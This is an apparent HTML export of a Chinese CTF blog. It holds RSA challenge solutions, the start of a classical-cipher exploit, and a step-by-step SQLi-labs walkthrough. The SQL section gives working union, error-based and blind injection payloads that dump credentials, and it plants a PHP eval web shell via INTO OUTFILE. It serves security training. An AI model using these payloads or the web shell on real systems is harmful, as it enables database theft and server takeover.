class="number">518</span>):</span><br><span class="line">        s = (l+r)//<span class="number">2</span></span><br><span class="line">        v = s*s - (<span class="number">9</span>*s**<span class="number">2</span>*(K-<span class="number">1</span>-s)**<span class="number">2</span>//(<span class="built_in">round</span>(N**<span class="number">0.25</span>)**<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> v &lt; <span class="number">4</span>*N:</span><br><span class="line">            l = s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">S = factor(K, n)</span><br><span class="line">d = inverse(e, n+<span class="number">1</span>+S)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;&#x27;</span>.join(long_to_bytes(i) <span class="keyword">for</span> i <span class="keyword">in</span> mul(d, c)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 商业转载请联系作者获得授权，非商业转载请注明出处。</span></span><br><span class="line"><span class="comment"># For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source.</span></span><br><span class="line"><span class="comment"># 协议(License)：署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)</span></span><br><span class="line"><span class="comment"># 作者(Author)：Wankko Ree</span></span><br><span class="line"><span class="comment"># 链接(URL)：https://www.wkr.moe/ctf/523.html</span></span><br><span class="line"><span class="comment"># 来源(Source)：Wankko Ree&#x27;s Blog</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="本题总结：-1"><a href="#本题总结：-1" class="headerlink" title="本题总结："></a>本题总结：</h3><p>本题为虎符2021密码原题。<del>太卷了太卷了。</del>详细原理可以看</p>
<p>d33b4t0巨佬博客中对虎符原题的讲解。exp改编自他的解题脚本。其中注释部分除去讲解，均为sage运行。</p>
<h3 id="参考资料：-1"><a href="#参考资料：-1" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://d33b4t0.com/2021/04/09/HFCTF%202021%20Crypto%20WP/">d33b4t0巨佬虎符CTF密码wp</a></p>
<p><a href="https://www.wkr.moe/ctf/523.html">Wankko Ree国赛wp</a></p>
<h2 id="三卷：rsa"><a href="#三卷：rsa" class="headerlink" title="三卷：rsa"></a>三卷：rsa</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><p>out:</p>
<p>已整理进chall.py多行注释中。</p>
<p>chall.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> text,flag</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> md5.new(text).hexdigest() == flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg1 = text[:xx]</span><br><span class="line">msg2 = text[xx:yy]</span><br><span class="line">msg3 = text[yy:]</span><br><span class="line"></span><br><span class="line">msg1 = bytes_to_long(msg1)</span><br><span class="line">msg2 = bytes_to_long(msg2)</span><br><span class="line">msg3 = bytes_to_long(msg3)</span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">N1 = p1*q1</span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg1,e1,N1)</span><br><span class="line"><span class="built_in">print</span> (e1,N1)</span><br><span class="line"></span><br><span class="line">p2 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = getPrime(<span class="number">512</span>)</span><br><span class="line">N2 = p2*q2</span><br><span class="line">e2 = <span class="number">17</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg2,e2,N2)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg2,e3,N2)</span><br><span class="line"><span class="built_in">print</span> (e2,N2)</span><br><span class="line"><span class="built_in">print</span> (e3,N2)</span><br><span class="line"></span><br><span class="line">p3 = getPrime(<span class="number">512</span>)</span><br><span class="line">q3 = getPrime(<span class="number">512</span>)</span><br><span class="line">N3 = p3*q3</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg3,e3,N3)</span><br><span class="line"><span class="built_in">print</span> (e3,N3)</span><br><span class="line"><span class="built_in">print</span> p3&gt;&gt;<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmsg1_e1_n1 = 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line"><span class="string">e1_n1 = (3, 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L)</span></span><br><span class="line"><span class="string">cmsg2_e2_n2 = 54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line"><span class="string">cmsg2_e3_n2 = 91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line"><span class="string">e2_n2 = (17, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)</span></span><br><span class="line"><span class="string">e3_n2 = (65537, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)</span></span><br><span class="line"><span class="string">cmsg3_e3_n3 = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line"><span class="string">e3_n3 = (65537, 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L)</span></span><br><span class="line"><span class="string">高位p3 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>送分题，都是很常见的rsa套路。</p>
<p>从题目可以看出，flag为text的md5值得到。然后text被拆成了3段，需要分别解出message1,message2,message3，拼接成text。</p>
<p>第一段是小加密指数爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (gmpy2.iroot(c + k * n, e)[<span class="number">1</span>] == <span class="literal">False</span>):</span><br><span class="line">    	k += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(c + k *n,e)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531565492-cf798b69-e0ce-4753-af81-fed94cc715de.png" alt="image-20210519230937082"></p>
<p>解得k=0 ？？？<del>鞭尸红明谷2021密码第一道RSA？</del></p>
<p>第二段共模攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span></span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">c1 = <span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line"></span><br><span class="line">g, x, y = gmpy2.gcdext(e1, e2) <span class="comment">#先通过扩展欧几里得算法求出x * e1 + y * e2 = 1中的x和y</span></span><br><span class="line"><span class="comment">#print(x, y)</span></span><br><span class="line">m = <span class="built_in">pow</span>(c1, x, n) * <span class="built_in">pow</span>(c2, y, n) % n <span class="comment">#计算(c1的x次方 * c2的y次方) mod n</span></span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531558163-1addd8d7-7383-41c2-a8b9-cdf00c78683b.png" alt="image-20210519231043784"></p>
<p>第三段coppersmith定理已知高位p</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L</span></span><br><span class="line">p4 = <span class="number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="comment">#经过以上一些函数处理后，n和p已经被转化为10进制</span></span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">	p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;n: &quot;</span>+<span class="built_in">str</span>(n))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;p: &quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;q: &quot;</span>+<span class="built_in">str</span>(n//p))</span><br></pre></td></tr></table></figure>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531574004-3c8a0020-9e88-4151-8975-321919081454.png" alt="image-20210519231438772"></p>
<p>解出p、q后，直接求欧拉函数的逆元一把梭了。</p>
<p>得到三段message后，拼接一下得到text，再用python2求一下md5，得到答案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CISCN&#123;3943e8843a19149497956901e5d98639&#125;</span><br></pre></td></tr></table></figure>
<h3 id="本题总结：-2"><a href="#本题总结：-2" class="headerlink" title="本题总结："></a>本题总结：</h3><p>应该是防止三卷爆零设置的rsa套娃题，都是相当基础的解法，不再做分析。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">翅膀师傅的RSA讲解</a></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入之sqlilab</title>
    <url>/2021/05/14/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlilab/</url>
    <content><![CDATA[<h1 id="sqlilab学习"><a href="#sqlilab学习" class="headerlink" title="sqlilab学习"></a>sqlilab学习</h1><p>sqlilabs练习，主要参考郁离歌大佬的博客和SQL注入天书。</p>
<span id="more"></span>
<h2 id="联合查询篇"><a href="#联合查询篇" class="headerlink" title="联合查询篇"></a>联合查询篇</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>1、先输入<code>?id=1 and 1=2</code>判断发现回显正常，显然不是数字型注入。</p>
<p>2、在<code>?id</code>后面加上<code>&#39;</code> ,回显报错，存在字符型注入。</p>
<p>3、在后面加上注释符<code>#</code>或<code>--+</code>后，页面回显正常，可以得出存在单引号字符型注入。</p>
<p>4、使用以下payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+   //1,2,3回显均正常，4回显不正常。</span></span><br></pre></td></tr></table></figure>
<p>说明此表有3列。</p>
<p>5、使用payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
<p>联合查询语句查看页面是否有回显，发现页面回显2、3，说明页面有2个显示位。</p>
<p>看一下源码，mysql_fetch_array只被调用了一次，</p>
<p>而mysql_fetch_array从结果集中取得一行作为关联数组</p>
<p>或数字数组或二者兼有，具体看第二个参数是什么。</p>
<p>所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
<p>只要让第一行查询的结果是空集0或-1，即union左边的select子句查询结果为空，</p>
<p>那么union右边的查询结果自然就成为了第一行，打印在网页上了。</p>
<p>6、使用payload爆库名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</span></span><br></pre></td></tr></table></figure>
<p>7、使用payload爆库security的表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
<p>ps：table_schema=后面可以直接加单引号括起的数据库名，也可以是数据库的16进制，过滤单引号可用。</p>
<p>首先说一下mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，<br>用户权限等信息，下面说一下常用的几个表</p>
<p>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p>
<p>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</p>
<p>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等。是show columns from schemaname.tablename的结果取之此表。</p>
<p>8、爆列</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
<p>9、爆数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,username,password from users where id=2--+   //查看第二栏的数据</span></span><br></pre></td></tr></table></figure>
<h4 id="SQL语句："><a href="#SQL语句：" class="headerlink" title="SQL语句："></a>SQL语句：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p> 同1的做法，只是闭合的SQL语句不同。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>语句不同。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><p>语句不同。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="盲注篇"><a href="#盲注篇" class="headerlink" title="盲注篇"></a>盲注篇</h2><h3 id="基础知识：sql注入截取字符串"><a href="#基础知识：sql注入截取字符串" class="headerlink" title="基础知识：sql注入截取字符串"></a>基础知识：sql注入截取字符串</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671531751563-11f58953-0a1e-4688-9502-2f0cff8df865.png" alt="image-20210524090237647"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531758614-acfd7890-957f-4e75-bdde-b83715de7ce1.png" alt="image-20210524090313928"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531764848-bdcc8c0f-3d0f-4d48-9188-0c3f5ee9cf50.png" alt="image-20210524090338115"></p>
<p>同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
<p>例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</p>
<h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><p>报错注入</p>
<p>1、使用left()爆基本信息(版本号)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and left(version(),1)&lt;6--+</span></span><br></pre></td></tr></table></figure>
<p>爆数据库长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and length(database())&lt;9--+</span></span><br></pre></td></tr></table></figure>
<p>2、爆当前用户名数据库等基本信息</p>
<p>双查询注入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union Select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531771216-eafd3649-84a4-47a9-9bcf-5008aea2052a.png" alt="image-20210528225944247"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531775645-302a4bc0-4137-481d-927d-d640c6fc6f58.png" alt="image-20210528230013553"></p>
<p>3、爆表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;, floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
<p>如需爆不同的数据库，在<code>security</code>处做修改。</p>
<p><code>limit 0,1</code>可以用来修改，爆出当前目录下的所有值。</p>
<p>4、爆列</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>emails<span class="string">&#x27; limit 0,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;, floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
<p>同理，在<code>security</code>和<code>email</code>处修改。</p>
<p>5、爆数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select email_id from emails limit 0,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;, floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
<p>修改点在列名<code>email_id</code>和表名<code>emails</code></p>
<h4 id="SQL语句：-1"><a href="#SQL语句：-1" class="headerlink" title="SQL语句："></a>SQL语句：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><p>同less-5，只是闭合方式有显著不同。</p>
<p>SQL语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h3><p>时间盲注</p>
<p>1、爆库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)</span><br></pre></td></tr></table></figure>
<p>2、爆表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select table_name from information_schema.tables where table_schema&#x3D;&#39;ctfshow&#39; limit 0,1)</span><br></pre></td></tr></table></figure>
<p>3、爆列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select column_name from information_schema.columns where table_name&#x3D;&#39;flagug&#39; limit 1,1)</span><br></pre></td></tr></table></figure>
<p>4、爆数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select flag4a23 from ctfshow.flagug limit 0,1)</span><br></pre></td></tr></table></figure>
<h2 id="文件导入："><a href="#文件导入：" class="headerlink" title="文件导入："></a>文件导入：</h2><h3 id="相关原理：SQLI-LABS修炼笔记（三）"><a href="#相关原理：SQLI-LABS修炼笔记（三）" class="headerlink" title="相关原理：SQLI-LABS修炼笔记（三）"></a>相关原理：<a href="http://yulige.top/?p=103">SQLI-LABS修炼笔记（三）</a></h3><h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>根据less-1中查询数据库的绝对路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,@@datadir,3--+</span><br></pre></td></tr></table></figure>
<p>得到路径为<code>/var/lib/mysql/</code></p>
<p>测试下得到SQL语句为<code>&#39;))</code></p>
<p>蒙一个常见路径，上蚁剑</p>
<p>构筑payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;--+</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>几道比赛中遇到的密码题</title>
    <url>/2021/05/09/%E5%87%A0%E9%81%93%E6%AF%94%E8%B5%9B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81%E9%A2%98/</url>
    <content><![CDATA[<h1 id="比赛中的Crypto题复现"><a href="#比赛中的Crypto题复现" class="headerlink" title="比赛中的Crypto题复现"></a>比赛中的Crypto题复现</h1><p>今年比赛中做到的一些高质量的密码题。</p>
<span id="more"></span>
<h2 id="2021蓝帽杯初赛classic"><a href="#2021蓝帽杯初赛classic" class="headerlink" title="2021蓝帽杯初赛classic"></a>2021蓝帽杯初赛classic</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> l1, l2, text, key, flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># text is a plain English text which only consists of lowercase letters (without any symbol)</span></span><br><span class="line">table = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> key <span class="keyword">in</span> text</span><br><span class="line"><span class="keyword">assert</span> l1 * l2 &lt; <span class="number">100</span></span><br><span class="line"></span><br><span class="line">k1 = []</span><br><span class="line">k2 = []</span><br><span class="line"></span><br><span class="line">fib = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">modulus = randint(<span class="number">12345</span>,<span class="number">6789010</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; <span class="number">16</span>):</span><br><span class="line">    fib.append((fib[-<span class="number">1</span>] + fib[-<span class="number">2</span>]) % modulus)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l1):</span><br><span class="line">    k1.append(fib[randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>)] % <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l2):</span><br><span class="line">    k2.append(fib[randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>)] % <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="string">''</span>.join(table[((<span class="built_in">ord</span>(x) - <span class="number">97</span>) * (k1[i % l1]) + k2[i % l2]) % <span class="number">26</span>] <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">aes = AES.new(key.encode(), AES.MODE_CBC, <span class="string">b'\0'</span> * <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(aes.encrypt(flag + <span class="string">b'\0'</span> * (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><p>Python2环境：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf_8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gm</span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line">  <span class="comment">#太长了不写了</span></span><br><span class="line"></span><br><span class="line">best_index_of_Coincidence = <span class="number">0.065</span></span><br><span class="line"></span><br><span class="line">best_freq = {}</span><br><span class="line">best_freq[<span class="string">'a'</span>] = <span class="number">0.08167</span></span><br><span class="line">best_freq[<span class="string">'b'</span>] = <span class="number">0.01492</span></span><br><span class="line">best_freq[<span class="string">'c'</span>] = <span class="number">0.02782</span></span><br><span class="line">best_freq[<span class="string">'d'</span>] = <span class="number">0.04253</span></span><br><span class="line">best_freq[<span class="string">'e'</span>] = <span class="number">0.12702</span></span><br><span class="line">best_freq[<span class="string">'f'</span>] = <span class="number">0.02228</span></span><br><span class="line">best_freq[<span class="string">'g'</span>] = <span class="number">0.02015</span></span><br><span class="line">best_freq[<span class="string">'h'</span>] = <span class="number">0.06094</span></span><br><span class="line">best_freq[<span class="string">'i'</span>] = <span class="number">0.06966</span></span><br><span class="line">best_freq[<span class="string">'j'</span>] = <span class="number">0.00153</span></span><br><span class="line">best_freq[<span class="string">'k'</span>] = <span class="number">0.00772</span></span><br><span class="line">best_freq[<span class="string">'l'</span>] = <span 